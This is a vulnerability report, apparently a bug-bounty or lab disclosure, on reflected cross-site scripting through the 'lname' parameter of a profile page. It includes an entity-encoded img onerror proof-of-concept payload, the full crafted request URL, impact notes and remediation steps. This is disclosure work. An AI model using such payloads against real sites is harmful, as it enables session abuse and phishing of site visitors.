## Title

Reflected XSS Through the Last Name Field

## Description

**Affected URL:** https://profile.pwnedbox.site/

**Vulnerability Type:** Reflected Cross-Site Scripting (XSS)

**Affected Parameter:** `lname`

The page accepts a value through the Last Name field and sends it using the `lname` GET parameter. During testing, an HTML image element with an encoded event-handler value was submitted. The browser executed the JavaScript and displayed an alert, showing that the reflected input was not safely handled.

## Steps to Reproduce

1. Open https://profile.pwnedbox.site/.
2. Enter the following test payload in the **Last Name** field:

   ```html
   "><img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">
   ```

3. Leave the First Name field empty.
4. Click **Submit**.
5. Observe the JavaScript alert displaying `1`.

### Payload Used

```html
"><img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">
```

### HTTP Request / URL

```http
https://profile.pwnedbox.site/?fname=&lname=%22%3E%3Cimg+src%3Dx+onerror%3D%22%26%2397%3B%26%23108%3B%26%23101%3B%26%23114%3B%26%23116%3B%26%2340%3B%26%2349%3B%26%2341%3B%22%3E
```

## POC (Proof of Concept)

### Screenshot 1 – Payload Entered in the Last Name Field

<img width="940" height="493" alt="image" src="https://github.com/user-attachments/assets/b3be54f3-7c82-41f1-a061-b8aed70adda4" />

### Screenshot 2 – JavaScript Alert Executed

<img width="940" height="486" alt="image" src="https://github.com/user-attachments/assets/c3c25052-a9d3-4a99-be71-9882134692a5" />


## Impact

- Display misleading content in the page.
- Show a fake form or prompt to collect information.
- Attempt actions available to the visitor's active session.

## Remediation

- Encode the `lname` value according to its HTML output context before displaying it.
- Treat all values received through GET parameters as untrusted input.
- Avoid inserting raw user-controlled input into HTML attributes or page content.
- Use safe DOM methods and apply a restrictive Content Security Policy (CSP) as an additional protection.
